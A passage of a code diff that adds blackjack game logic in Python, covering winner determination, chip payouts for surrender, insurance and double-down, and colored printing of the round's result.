+            return 'Dealer' if self.player.is_point('>',
+                                                    BLACK_JACK) else 'Player'
+
+        if self.choice == 'Surrender':
+            return 'Dealer'
+        elif self.choice == 'Insurance':
+            if self.player.is_point('==', BLACK_JACK):
+                return 'Dealer'
+            return 'Player'
+
+        if self.choice in ('Double-down', 'Stand'):
+            self.player.calculate_point()
+            self.dealer.calculate_point()
+            if self.player.point > self.dealer.point:
+                return 'Player'
+            return 'Dealer'
+
+        return 'Both'
+
+    def calculate_chips(self):
+        if self.choice == 'Surrender':
+            if self.player.chips.bet_amount == 1:
+                if self.player.chips.current_amount() == 0:
+                    self.player.chips.amount = 0
+            else:
+                surrender_amount = self.player.chips.bet_amount // 2
+                self.player.chips.amount -= surrender_amount
+
+        elif self.choice in ('Double-down', 'Stand', 'Insurance', 'Hit'):
+            if self.winner == 'Player':
+                self.player.chips.amount += (self.player.chips.bet_amount +
+                                             self.player.chips.insurance * 2)
+            elif self.winner == 'Dealer':
+                self.player.chips.amount -= (self.player.chips.bet_amount +
+                                             self.player.chips.insurance)
+
+    def result_exhibit(self):
+        def get_color():
+            if 'BUST' in content:
+                return COLOR.get('RED' if 'Player' in content else 'GREEN')
+            if self.winner == 'Player':
+                return COLOR.get('GREEN')
+            elif self.winner == 'Dealer':
+                return COLOR.get('RED')
+            else:
+                return COLOR.get('YELLOW')
+
+        end = COLOR.get('END')
+        content = str(self.res)
+        color = get_color()
+        winner_fmt = color + '\n\t>> {content} <<\n' + end
+        print(winner_fmt.format(content=content))
